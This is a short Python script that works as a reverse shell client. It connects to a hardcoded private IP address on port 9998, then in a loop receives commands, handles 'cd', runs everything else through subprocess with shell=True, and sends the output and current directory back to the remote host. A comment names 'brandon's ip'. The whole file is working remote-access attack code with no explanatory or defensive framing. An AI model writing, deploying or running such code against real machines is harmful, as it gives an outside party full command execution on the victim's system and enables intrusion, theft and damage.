import socket
import os
import subprocess

# create a socket
s = socket.socket()
# brandon's ip: 10.250.0.1
host = '10.250.64.198'
port = 9998

s.connect((host, port))

while True:
    data = s.recv(1024)

    # make sure there isn't cd
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)